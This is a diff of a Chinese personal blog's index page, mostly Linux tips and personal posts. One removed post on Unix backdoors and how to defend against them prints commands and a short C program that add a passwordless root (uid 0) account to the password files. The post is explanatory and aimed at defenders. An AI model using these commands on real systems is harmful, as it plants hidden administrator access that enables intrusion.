@@ -3,7 +3,7 @@
 <html>
 <head>
 	<meta charset="utf-8">
-	<title>0cean's Blog|0cean的个人博客</title>
+	<title>0cean的个人博客</title>
 	<meta name="author" content="0cean">
 
 	
@@ -11,7 +11,7 @@
 	<meta name="keywords" content="学习,技术,生活,工作,网络,随笔,个人博客">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-	<link href="/atom.xml" rel="alternate" title="0cean's Blog|0cean的个人博客" type="application/atom+xml">
+	<link href="/atom.xml" rel="alternate" title="0cean的个人博客" type="application/atom+xml">
 	<link rel="canonical" href="">
 	<link href="/favicon.png" rel="shortcut icon">
 	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
@@ -22,7 +22,7 @@
 
 
 <body>
-	<header id="header" class="inner"><h1><a href="/">0cean's Blog|0cean的个人博客</a></h1>
+	<header id="header" class="inner"><h1><a href="/">0cean的个人博客</a></h1>
 <nav id="main-nav"><ul class="main">
 	<li><a href="/">主页</a></li>
 	<li><a href="/blog/archives">存档</a></li>
@@ -78,479 +78,6 @@
 		
 	
 	<div id="content" class="inner">
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/05/02/automatic-operation-and-the-release-of-ssh-port/">
-		
-			SSH自动运行以及端口释放</a>
-	</h2>
-	<div class="entry-content">
-		<p>由于某墙的原因，之前一直在使用vpn代理国外的网站。由于vpn是全局代理，开了vpn后会影响访问国内网站的速度，甚至有些国内网络服务屏蔽了国外IP，因此还需要配置路由表，访问国外网站的走vpn，国内网站走本地网络。目前改用ssh代理，ssh端口转发配合firefox的autoproxy的实现socks 5代理。autoproxy的自动模式可以根据已有规则对被墙掉的网站自动代理。
-ssh连接每次输入密码很麻烦，索性生成ssh证书用ssh-copy-id 将本地证书上传服务器，这样每次ssh连接验证证书就不用输入密码，不过这样做的缺点是降低了安全性，可能会造成证书泄漏。手动SSH连接也很麻烦，而且ssh掉线或超过Idle时间被ssh服务端踢出后不会自动连接，虽然可以通过脚本定时查看SSH进程是否存在自动重连，但遇到隧道假死也就没办法了，好在后来发现一个小工具autossh可以实现SSH自动连接，于是写了一个脚本，开机自动运行：</p>
-
-<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">AUTOSSH_LOGLEVEL</span><span class="o">=</span>7
-</span><span class='line'><span class="nb">export </span><span class="nv">AUTOSSH_DEBUG</span><span class="o">=</span>DEBUG
-</span><span class='line'><span class="nb">export </span><span class="nv">AUTOSSH_LOGFILE</span><span class="o">=</span>~/.autossh.log
-</span><span class='line'>autossh -M 2000 -N -f -q -D 127.0.0.1:7070 user@hostname
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>autossh支持环境变量，具体参考 http://www.harding.motd.ca/autossh/README ，上面的脚本里指定了debug级别以及debug log存放路径。
-但是每次系统挂起或休眠后再唤醒ssh代理就失效了，查看autossh.log发现是端口占用问题,直接结束占用端口的ssh，重新运行脚本。此处因为
-知道是什么进程占用哪个端口，所以可以直接结束。如果遇到未知的程序占用问题，可以用下列方法查看</p>
-
-<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>lsof -i :port
-</span><span class='line'>netstat -an |grep port
-</span><span class='line'>fuser -n tcp/udp port
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>查到后kill掉就可以释放端口，如果是释放mysq的端口则建议使用kill结束指定占用端口的进程而不要killall mysql程序，否则可能会产生数据库碎片。</p>
-
-<p>后续:我写的ssh自动运行脚本是通过系统的启动运行程序来是实现开机自动运行，所以会导致挂起或休眠后再次唤醒ssh隧道无法使用提示端口占用
-Ubuntu下写daemon脚本有两个选择，一种是写传统的/etc/init.d下的脚本，另一种就是Ubuntu特有的upstart脚本。
-upstart是Ubuntu设计用来替换传统的SysV init的软件。upstart的daemon脚本除了更加简洁之外，还支持服务的自动唤醒（respawn）。这样autossh本身如果出错退出了，也会立即被upstart唤醒。避免autossh出错退出导致ssh隧道无法访问。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-05-02T00:00:00+08:00" pubdate data-updated="true">May 2<span>nd</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/linux/'>Linux</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/05/02/automatic-operation-and-the-release-of-ssh-port/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/29/virtualbox-usb-subsystem-failed-to-resolve-access-problems/">
-		
-			解决virtualbox访问usb子系统失败问题的方法</a>
-	</h2>
-	<div class="entry-content">
-		<p>安装virtualbox后运行虚拟机后发现usb不能识别，提示：
-<code>
-Could not load the Host USB Proxy Service (VERR_FILE_NOT_FOUND). The service might be not installed on the host computer.</p>
-
-<p>Result Code:
-0x80004005
-Component:
-Host
-Interface:
-IHost {81729c26-1aec-46f5-b7c0-cc7364738fdb}
-Callee:
-IMachine {31f7169f-14da-4c55-8cb6-a3665186e35e}
-</code>
-在网上看到许多方法，都需要修改 /etc/fstab ，实际上最新版的virtualbox已经解决了这些问题，只需要将当前用户添加到vboxusers组：</p>
-
-<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo  useradd -g  用户名 vboxusers
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>然后重启电脑，就可以在虚拟机里使用usb</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-29T00:00:00+08:00" pubdate data-updated="true">Apr 29<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/linux/'>Linux</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/04/29/virtualbox-usb-subsystem-failed-to-resolve-access-problems/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/19/interesting-sites-google-shell/">
-		
-			有趣的网站：谷歌 Shell</a>
-	</h2>
-	<div class="entry-content">
-		<p>http://goosh.org 是一个非谷歌官方的基于谷歌服务的web shell，访问者可以通过命令的方式在web shell中使用谷歌的各种服务，甚至可以登录自己的谷歌帐号，但ocean不建议访问者登陆自己的帐号，如本文开始所说，这是一个非谷歌官方的网站，登陆个人谷歌帐号，可能导致用户心信息泄露。
-首先我们查看一下基本的命令：
-<img src="http://nwy.me/img/2011/04/goosh.org-the-unofficial-google-shell._1303186503427.png" alt="谷歌shell" />
-alias是命令的别名，方便记忆以及输入。</p>
-
-<p>输入“s+ocean”就可以搜索“ocean”，很遗憾的是ocean的个人博客还没有在谷歌英文搜索结果页面排名第一。谷歌shell还有诸多的功能，搜索新闻，博客，视频，图片，地图等等，这里就不再做逐一介绍。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-19T00:00:00+08:00" pubdate data-updated="true">Apr 19<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/personal/'>Personal</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/04/19/interesting-sites-google-shell/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/19/excellent-unix-administrators-should-have-the-quality-of-9/">
-		
-			优秀的 Unix 管理员应具有的9大品质</a>
-	</h2>
-	<div class="entry-content">
-		<p>翻译来源链接：http://www.techweb.com.cn/news/2011-03-15/990928.shtml
-英文原文：http://www.infoworld.com/t/unix/nine-traits-the-veteran-unix-admin-276</p>
-
-<p>优秀的Unix管理员应该具有的品质之一：我们不使用sudo</p>
-
-<p>就像“caps lock”对于极客来说只是一个可有可无的控制键一样，sudo也只是胆小者的拐杖。如果我们需要对root做一些事情，我们需要su到root，这个sudo废话毫无意义。</p>
-
-<p>实际上，对于那些强制所有用户都要使用sudo的类Unix的操作系统来说，我们要做的第一件事情就是sudo su -，然后改变根口令，以便于以后我们可以更加方便地su -。使用sudo就像在带有充气减震器的水槽中打保龄球——的确很安全，但是你也别想一展身手了。</p>
-
-<p>优秀的Unix管理员应该具有的品质之二：我们使用vi，而不是emacs，更不可能是pico或nano</p>
-
-<p>虽然我们知道，对于许多Unix管理员来说，emacs更贴心一些，但是，实际上它只是Microsoft Word的Unix翻版而已。vi（和vim）才是那些真正的Unix极客们手中的利器，他们需要在完成任务的同时，不被那些emacs自带的毫无用处的 东西把事情搞糟。Emacs居然内置了一款俄罗斯方块游戏，简直是岂有此理！</p>
-
-<p>虽然我只能万般无奈地承认vim中那些花哨的功能（例如：代码折叠和语法高亮）可能只是一时失误，但是，在一天的工作即将结束之际，真正的Unix 工作可以和vi的模型编辑概念很好地融合在一起却是不争的事实。除此之外，它那苗条的身材和通用的可移植性可以让它成为一个真正的编辑器。感谢Bill！ 感谢Bram！（编辑注：Bill Joy是vim编辑器的开发者，后来Bram Moolenaar对其进行了改进）。</p>
-
-<p>优秀的Unix管理员应该具有的品质之三：我们把正则表达式当成我们的利器</p>
-
-<p>对于正则表达式的排斥，甚至是漠视似乎都是“邪恶”的键盘造成的恶果。但是，对于我们来说，它是如诗般优雅的。它的强大表现在，任何其他的著名工具 都无法和pcre (Perl Compatible Regular Expressions)的复杂性相匹敌。如果你需要在100000行文件中替换掉每一行的第三个字符（除了那些后面是数字4的字符之外），那么正则表达 式不只是完成这个任务的一个工具而已——它还是完成这个任务的唯一工具。那些可怜的人时常会在他们的email中接收到一些字符串片段和一些声泪俱下的请 求（寻求一个解析这些字符串的正则表达式），一般还会承诺请你喝一杯（但是从来没有兑现过）。</p>
-
-<p>优秀的Unix管理员应该具有的品质之四：我们天生就比较懒惰</p>
-
-<p>当遇到一个看起来需要很多手工的，重复性的工作才能解决的问题的时候，我们这些守旧派的Unix代表一定会选择编写一些代码来搞定它的。这通常会比 手工操作更加节省时间，虽然有时候事实也并非如此。无论如何，我们宁愿把时间花费在可以以后被引用或者使用的工作上面，也不愿意简单地修复眼前这个问题。 通常，当几年以后我们遇到了类似的问题，然后可以从我们的起始目录（home directory）中的一个文件yank几百行Perl代码，在短短的几分钟之内解决掉了这个问题，然后回过头去分析那些可以提高工作效率的其他代码的 时候，我们就可以获得回报了。或者，我们也可以去玩一下愤怒的小鸟。</p>
-
-<p>优秀的Unix管理员应该具有的品质之五：我们更喜欢优雅的解决方案</p>
-
-<p>如果有好几种方法可以修复一个问题或者实现一个目标，那么我们会选择花费更多的时间来开发一个既可以解决当前的问题又能防止将来发生类似的问题的解 决方案，而不是简单地贴上一块邦迪牌创可贴。这是因为我们讨厌再次遇到那些在我们的印象中已经解决过的问题。我们认为，如果我们可以提前多考虑几步，防止 将来发生类似的问题，那么在将来，我们可以节省更多的精力。通常我们都是对的。</p>
-
-<p>优秀的Unix管理员应该具有的品质之六：我们一般对事不对人</p>
-
-<p>enlightenment有足够的把握可以让你的Unix基础知识达到一定的水平。这意味着我们从不认为一个问题会一直存到我们发现它为止。告诉 一个优秀的Unix管理员，一个文件“vanished”了，他只会轻蔑地嘲笑你。证明给她看，这真的发生了，他就会不知疲倦地研究这个问题了，直到可以 找到一个合理的原因和解决方案为止。许多人都认为这是傲慢和自负的表现。的确是——但是我们有这个资本。</p>
-
-<p>优秀的Unix管理员应该具有的品质之七：我们研究问题的时候，比医生的检查还要细致</p>
-
-<p>当处理一个大问题的时候，我们在“尸检”上花费的时间要比我们解决这个问题所花费的时间多得多。如果不是工作压力太大，让我们无暇分身去研究这个问 题，那么我们一定会搞清楚这个问题的确切原因的。在一个强悍的Unix管理员的工作中，不存在不可思议的现象。每一种情况必须要有逻辑起点，而且可以按照 合适的路径来追本溯源。简而言之，每一件事情都有原因，在找到这个原因以前，我们绝不放弃！</p>
-
-<p>对于我们来说，通过HUPping一个进程，或者改变一个文件或777目录的权限来“止血”是一件很容易的事情，但是这连成功的一般都算不上。为什么这个进程必须要重启？这并不是必须的，我们需要知道为什么。</p>
-
-<p>优秀的Unix管理员应该具有的品质之八：关于Windows，我们知道的也很多（过去我们只是装作不知道而已）</p>
-
-<p>虽然在我们自己的机器上，我们可能并不运行Windows，而且，对于Windows服务器，我们似乎也不屑一顾，但是在诊断和修复Windows 问题方面，我们却是行家里手。这是因为，当它们的“鲜血”流到我们的“版图”上的时候，我们必须要处理这些问题。但是，我们不喜欢承认这个事实，因为大多 数情况下Windows都没有Unix那样深厚的逻辑基础，这让我们很困扰。参见上面的品质五和品质六。</p>
-
-<p>优秀的Unix管理员应该具有的品质之九：几乎从来都不选择重启</p>
-
-<p>Unix设备不需要重启。如果并非绝对没有其他选择，我们会花费数个小时在系统运行的状态下修复这个问题，而不是重启。我们的想法是除了内核或硬件 改动，其他情况下都没有理由去重启，重启只是修复这个问题的临时办法而已。如果这个问题发生了一次，并且通过重启被“修复”了，那么它还会再次发生的。我 们宁愿修复这个问题，而不是简单地拔掉电源，等着它再次发生。</p>
-
-<p>从“谎言”的角度来看，这些品质中的某些品质看起来会有点另类或者难以理解，那是因为他们本来就是如此的。其他人只能看到棘手和困难的时候，我们却看到启示，学习，经验，更重要的是，我们看到了逻辑。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-19T00:00:00+08:00" pubdate data-updated="true">Apr 19<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/other/'>Other</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/04/19/excellent-unix-administrators-should-have-the-quality-of-9/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/09/notes/">
-		
-			随笔</a>
-	</h2>
-	<div class="entry-content">
-		<p>由于笔记本里逐渐积累的各类资料不断增多，笔记本原来160G的硬盘已经不够用了，购买了一款500G的硬盘，升级后换下来的160G硬盘放在硬盘盒里做移动硬盘。
- 因为之前系统安装compiz0.93出错，导致回滚版本后进不了compiz的控制面板，一直也没有找出问题以及其他种种待而未决的问题索性趁这次更换硬盘重装了Ubuntu，加之对系统做了许多修改，如果要重装系统就不得不重新修改，所以系统有种种自己不能解决的问题也不愿去重装系统，这也是自己一直不能改掉的惰性，害怕做出改变后失去现在的现状。之所以这次能下定决心要重装系统，其实是新硬盘安装上后从旧的硬盘恢复之前的备份系统的时候，发现备份脚本有问题，导致恢复备份的系统不能正常运行。好吧，没有退路了，重新开始吧。重装系统后用了近一周才把才把系统定制好，之前的配置都迁移过来了，并作了一些完善，唯一的遗留问题就blogilo的日志数据库打不开了，好在最近才开始用blogilo离线写日志，数据库里的文章博客上也有备份。</p>
-
-<p>最近在学习VIM和正则表达式，VIM的学习曲线确实很陡峭，纷繁的命令，按键组合，强大的插件，到现在也只是可以会用VIM而已，不过随着不断的学习已经彻底对VIM程序员御用文本编辑器所臣服。在firefox下安装vimperator插件后firefox整个也VIM化了，所有的动作就可以不用鼠标快速操作，手就不用在键盘于鼠标之间往返了，有网友甚至夸张说firefox只是vimperator的运行环境。新手学习VIM推荐闲耘写的VIM的wiki，上面有整理了许多VIM的资料：<a href="http://wiki.hotoo.me/Vim.html">http://wiki.hotoo.me/Vim.html</a>，初步了解VIM后可以浏览<a href="http://www.vimer.cn/">Vimer的程序世界</a>，这是我见过的最丰富的VIM中文博客。正则表达式学习过程相对比较顺利，目前可以实现一些简单的语句操作。最开始选的教材是余晟大师的《精通正则表达式》，很详尽，系统的教材，也很厚，于是望而退却选择网上网友写的一些学习笔记，却再次看到余晟大师在infoQ写的<a href="http://www.infoq.com/cn/author/%E4%BD%99%E6%99%9F">正则表达式的系列教程</a>，从中获益匪浅。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-09T00:00:00+08:00" pubdate data-updated="true">Apr 9<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/personal/'>Personal</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/04/09/notes/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/04/01/search-through-the-greatest-era-of-the-21st-century-cutting-edge-technology/">
-		
-			穿越搜索：21世纪最伟大的时代前沿技术</a>
-	</h2>
-	<div class="entry-content">
-		<h1>什么是穿越搜索？</h1>
-
-<p>穿越搜索就是让谷歌带你穿越时空，抵达你最想抵达的时间、地点，用身临其境的方式感知你想感知的一切。例如：</p>
-
-<p>想知道西施的减肥秘诀？今天地球上任何一个搜索引擎都无法给你准确答案。请使用谷歌穿越搜索！当你亲自穿越到英雄、美人、宝剑、名马的春秋末年，你有机会一睹西施的真容，当面向她请教瘦身秘籍！</p>
-
-<p>想了解“一骑红尘妃子笑”的传说是不是真实可信？请使用谷歌穿越搜索！当你亲自穿越到“宫中圣人奏云门，天下朋友皆胶漆”的大唐盛世，你将有机会夜游大明宫，亲眼目睹传说中的霓裳羽衣舞！</p>
-
-<p>想看看《红楼梦》写的究竟是不是曹雪芹的亲身经历？请使用谷歌穿越搜索！当你亲自坐在“批阅十载，增删五次”的伟大作家面前，与他品茶论道，漫谈人生，你很有可能成为地球上第一个见到林妹妹生活原型的现代人！</p>
-
-<p>想鉴别科幻小说的真伪，看四百年后，是不是真的有半人马座三星的访客来到地球？请使用谷歌穿越搜索！当你亲自体验到宇宙法则在星际交流中的重要作用，你有可能成为改变地球乃至宇宙历史的关键人物！你喜欢穿越吗？你想拥有不同寻常的人生体验吗？你想破解时空另一端的未解之谜吗？请在上面的搜索框中，输入你关心的问题并点击“搜索”按钮——谷歌穿越搜索将为你打开时空之门！<a href="http://www.google.cn/intl/zh-CN/landing/teleport/">请用鼠标猛击这里</a></p>
-
-<p><img src="http://nwy.me/img/2011/04/%E6%88%AA%E5%8F%96%E9%80%89%E5%8C%BA_010.png" alt="" /></p>
-
-<h1>谷歌如何实现穿越搜索？</h1>
-
-
-		
-		<a href="/blog/2011/04/01/search-through-the-greatest-era-of-the-21st-century-cutting-edge-technology/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-04-01T00:00:00+08:00" pubdate data-updated="true">Apr 1<span>st</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/personal/'>Personal</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/04/01/search-through-the-greatest-era-of-the-21st-century-cutting-edge-technology/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/03/31/unix-linux-technology-and-to-prevent-the-back-door/">
-		
-			Unix/Linux上的后门技术和防范</a>
-	</h2>
-	<div class="entry-content">
-		<p>Unix/Linux上的后门技术和防范</p>
-
-<p>对黑客来讲，入侵一个系统只是万里长征的开始，最主要的是长期占有一个肉鸡（傀儡机）， 所以，后门技术往往非常重要。对于我们来讲，总是处于被动的地位，百密一疏，总有没有做到位的地方，谁都不能保证自己的系统是绝对安全的，所以不能避免我 们可能会被入侵。黑客入侵后肯定会留后门，当然，除了那些高手，境界非常高，入侵只是为了测试或者技术挑战，对于一般黑客来讲，入侵之后留个后门是很重要 的，我们要防范，当然就要了解常用的后门技术，下面就简单的讲将在Unix/Linux系统中比较常见的后门技术。</p>
-
-<p>1.帐号后门</p>
-
-<p>最普通和原始的后门技术，一般就是在系统中添加一个管理员帐户。</p>
-
-<h1>echo”heiyeluren：*：0：0：：/root：/bin/sh”>；>；/etc/passwd</h1>
-
-<h1>echo”heiyeluren：：0：0：：0：0：：/root：/bin/sh”>；>；/etc/shadow</h1>
-
-<p>给系统增加一个uid和gid都为0（root）的帐号，无口令。</p>
-
-<p>FreeBSD的密码是存储在/etc/master.passwd里面的，那么后面的命令就应该改成：</p>
-
-<h1>echo”heiyeluren：：：：：：：：：”>；>；/etc/master.passwd</h1>
-
-<p>也可以使用程序来实现：</p>
-
-<p>/<em>Addsuperuser</em>/</p>
-
-<h1>include”stdio.h”</h1>
-
-<h1>definePASSWD_PATH”/etc/passwd”</h1>
-
-<h1>defineSHADOW_PATH”/etc/master.passwd”</h1>
-
-<p>main（）</p>
-
-<p>{</p>
-
-<p>FILE*fd；</p>
-
-<p>fd=fopen（PASSWD_PATH，”a+”；</p>
-
-<p>fprintf（fd，”heiyeluren：*：0：0：：/root：/bin/sh\n”；</p>
-
-<p>fclose（fd）；</p>
-
-<p>fd=fopen（SHADOW_PATH，”a+”；</p>
-
-<p>fprintf（fd，”heiyeluren：：0：0：：0：0：：/root：/bin/sh\n”；</p>
-
-<p>fclose（fd）；</p>
-
-<p>}</p>
-
-<h1>gcc-oadduseradduser.c</h1>
-
-<h1>./adduser</h1>
-
-<p>这种方法比较傻，一般比较容易发现，特别是系统帐户不多的时候。也有的用户名起的比较迷惑人，比如起个r00t的用户名，uid和gid都是0，这样如果不注意，可能就会被蒙混过关了。</p>
-
-
-		
-		<a href="/blog/2011/03/31/unix-linux-technology-and-to-prevent-the-back-door/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-03-31T00:00:00+08:00" pubdate data-updated="true">Mar 31<span>st</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/other/'>Other</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/blog/2011/03/31/unix-linux-technology-and-to-prevent-the-back-door/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
 
 
     <article class="post">
@@ -719,28 +246,52 @@ You got in. That's right, man. I got in.</pre>
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/03/14/how-to-practice-ten-thousand-hours/">
+		<a href="/blog/2011/02/14/install-tpfan-in-ubuntu10-10/">
 		
-			怎样练习一万小时</a>
+			在ubuntu10.10下安装tpfan</a>
 	</h2>
 	<div class="entry-content">
-		<p>同人于野</p>
+		<p>tpfan的最后一个版本0.96,只适用于ubuntu9.04，本文是基于T61而写。</p>
 
-<p>(《新知客》，2010年8月。本来应该等到8月1日再发，但今天突然发现此文已经被在网上泄漏出来了！)</p>
+<p>1.下载tpfan的deb文件，http://ppa.launchpad.net/tp-fan/ppa/ubuntu/pool/main/t/tpfan-admin/tpfan-admin_0.96-ubuntu1_all.deb</p>
 
-<p>随着畅销书《异类》的流行，“练习一万小时成天才”这个口号现在是尽人皆知。也许仍然有不少人相信那些不世出的天才必有天生的神秘能力，但科学家通过大量的调查研究已经达成共识，那就是所有顶级高手都是练出来的。不但如此，最近几年的科学进展，人们可能第一次拥有了一个关于怎样炼成天才的统一理论。</p>
+<p>2.解压后修改debian文件夹中的control文件，将“python-gnome2-desktop”替换为“python-gnome2-desktop-dev”</p>
 
-<p>好消息是除了某些体育项目对天生的身高和体型有特殊要求之外，神秘的天生素质并不存在，也就是说人人都有可能成为顶级高手。早在20多年以前，芝加哥大学的教育学家 Benjamin Bloom 就曾经深入考察过120名从音乐到数学多个领域内的精英人物，发现他们幼年时代没有任何特别之处。后人的研究更证明，在多个领域内，就连智商都跟一个人能不能达到专家水平没关系。</p>
+<p>3.重写打包</p>
 
-<p>有个匈牙利心理学家很早就相信只要方法得当，任何一个人都可以被训练成任何一个领域内的高手。为了证明这一点，他选择了一个传统上女性不擅长的项目，也就是国际象棋。结果他和妻子把自己的三个女儿都训练成了国际象棋世界大师，这就是著名的波尔加三姐妹。这个实验甚至证明哪怕你不爱好这个领域，也能被训练成这个领域的大师，因为三姐妹中的一个并不怎么喜欢国际象棋。</p>
+<pre>dpkg-deb -D --build tpfan-admin_0.96-ubuntu1_all</pre>
 
-<p>而坏消息是成为大师需要长时间的苦练。每天练三小时，完成一万小时需要十年时间，但这只是达到世界水平的最低要求。统计表明对音乐家而言，世界级水平要求的训练时间是十五到二十五年。但最关键的并不是练习的时间，而是练习的方法。</p>
 
-<p>天才是怎样炼成的？中国传统思维比较强调一个“苦”字，冬练三九夏练三伏，甚至是头悬梁锥刺股。而近代生活条件越来越好，人们则开始强调一个“爱”字，说兴趣是最好的老师，强调寓教于乐，“哈佛女孩”的家长们纷纷写书，介绍自己的孩子如何一路玩进名校。</p>
+<p>4.安转</p>
+
+<p>5.修改/usr/lib/python2.6/dist-packages/tpfand/settings.py7. 替换行 170-174</p>
+
+<pre>self.product_id = None
+self.product_name = None
+self.product_pretty_vendor = None
+self.product_pretty_name = None
+self.product_pretty_id = None</pre>
+
+
+<p>替换为</p>
+
+<pre>self.product_id = ""
+self.product_name = ""
+self.product_pretty_vendor = ""
+self.product_pretty_name = ""
+self.product_pretty_id = ""</pre>
+
+
+<ol>
+<li></li>
+</ol>
+
+
+<pre>sudo /etc/init.d/tpfand restart</pre>
 
 
 		
-		<a href="/blog/2011/03/14/how-to-practice-ten-thousand-hours/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -757,16 +308,377 @@ You got in. That's right, man. I got in.</pre>
   
 
 
-<time datetime="2011-03-14T00:00:00+08:00" pubdate data-updated="true">Mar 14<span>th</span>, 2011</time></div>
+<time datetime="2011-02-14T00:00:00+08:00" pubdate data-updated="true">Feb 14<span>th</span>, 2011</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/other/'>Other</a>
+	<a class='category' href='/blog/categories/linux/'>Linux</a>
 
 
 </div>
 	
-	<div class="comments"><a href="/blog/2011/03/14/how-to-practice-ten-thousand-hours/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/blog/2011/02/14/install-tpfan-in-ubuntu10-10/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/31/happy-new-year-show-my-ubuntu/">
+		
+			新年快乐！我的Ubuntu秀</a>
+	</h2>
+	<div class="entry-content">
+		<p>在过去的一年经历了种种事情，得到或失去，痛苦或快乐，一切都随着2011年的到来而逝去，谨以此为记。</p>
+
+<p>用一段视频作为自己学习Linux过程的一个标记，距离自己发布的第一部ubuntu视频，时隔两年，第一部视频还是在家里的台式电脑上录制的，由于学习ubuntu认识了许多网友，加入过ubunuucircle杂志翻译小组，在ubuntuchina做过版主，两年间，ubuntu的版本也从当初开始使用的8.04到升级到目前的10.10.脱离windows平台后的自己在下一个两年会有多少进步？以现在为基数，届时再做对比。</p>
+
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="600" height="535" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0"><param name="align" value="middle">
+<param name="src" value="http://player.youku.com/player.php/sid/XMjMzNjM2MDY0/v.swf">
+<param name="quality" value="high">
+<embed type="application/x-shockwave-flash" width="600" height="535" src="http://player.youku.com/player.php/sid/XMjMzNjM2MDY0/v.swf" quality="high" align="middle"></embed></object>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-31T00:00:00+08:00" pubdate data-updated="true">Dec 31<span>st</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/31/happy-new-year-show-my-ubuntu/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/29/to-choose-or-not-to-choose-that-is-the-question/">
+		
+			To Choose or Not to Choose: That Is the Question</a>
+	</h2>
+	<div class="entry-content">
+		<p>前言：
+Life is full of choices, from the everyday to the life-altering. They  can be as mundane as, “What should I have for breakfast?” or as  important as, “What do I do with my life?” But rest assured, they’re  everywhere.</p>
+
+<pre>Choose life.
+选择生活。
+Choose a job.
+选择一份工作。
+Choose your friends.
+选择你的朋友。
+Choose a career.
+选择一项事业。
+Choose a family,
+选择你的家庭。
+Choose your future.
+选择你的未来。
+
+		
+		<a href="/blog/2010/12/29/to-choose-or-not-to-choose-that-is-the-question/" class="more-link">Read on &rarr;</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-29T00:00:00+08:00" pubdate data-updated="true">Dec 29<span>th</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/29/to-choose-or-not-to-choose-that-is-the-question/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/22/the-winter-solstice/">
+		
+			The Winter Solstice</a>
+	</h2>
+	<div class="entry-content">
+		<p>2010 Dec 22 20:40
